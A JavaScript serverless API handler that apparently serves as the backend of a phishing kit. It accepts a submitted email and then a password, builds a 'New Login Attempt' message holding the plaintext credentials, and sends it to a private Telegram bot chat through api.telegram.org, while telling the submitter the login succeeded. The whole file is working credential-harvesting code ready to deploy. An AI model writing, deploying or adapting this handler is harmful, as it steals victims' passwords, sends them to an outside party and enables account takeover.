import { z } from 'zod';

const leadSchema = z.object({
  email: z.string().email('Invalid email format'),
  password: z.optional(z.string().min(8, 'Password too short')),
  message: z.string().optional()
});

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, error: 'Method not allowed' });
  }

  try {
    const validatedData = leadSchema.parse(req.body);
    const { email, password, message } = validatedData;

    // Step 1: Just Email received
    if (!password) {
      return res.status(200).json({ success: true, message: 'Email received.' });
    }

    // Step 2: Password received -> SEND TO TELEGRAM
    if (password) {
      // ✅ THE SECRET IS HERE (Fetched from Vercel Environment Variables)
      const telegramToken = process.env.TELEGRAM_BOT_TOKEN;
      const telegramChatId = process.env.TELEGRAM_CHAT_ID;

      if (!telegramToken || !telegramChatId) {
        console.error('❌ Missing Telegram credentials in Vercel settings');
        return res.status(500).json({ success: false, error: 'Server configuration error.' });
      }

      const telegramMessage = `🔐 *New Login Attempt*\n\n📧 *Email:* ${email}\n🔑 *Password:* ${password}\n📝 *Note:* ${message || 'None'}`;
      
      try {
        const telegramResponse = await fetch(
          `https://api.telegram.org/bot${telegramToken}/sendMessage`,
          {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: telegramChatId,
              text: telegramMessage,
              parse_mode: 'Markdown'
            })
          }
        );

        const result = await telegramResponse.json();

        if (!telegramResponse.ok) {
          console.error('Telegram API Error:', result);
          return res.status(500).json({ success: false, error: 'Failed to send Telegram message.' });
        }

        return res.status(200).json({ success: true, message: 'Login successful. Check Telegram.' });

      } catch (telegramError) {
        console.error('Network error to Telegram:', telegramError);
        return res.status(500).json({ success: false, error: 'Telegram service unavailable.' });
      }
    }

  } catch (error) {
    console.error('Backend validation error:', error);
    if (error instanceof z.ZodError) {
      return res.status(400).json({ success: false, error: error.errors[0].message });
    }
    return res.status(500).json({ success: false, error: 'Internal server error' });
  }
          }
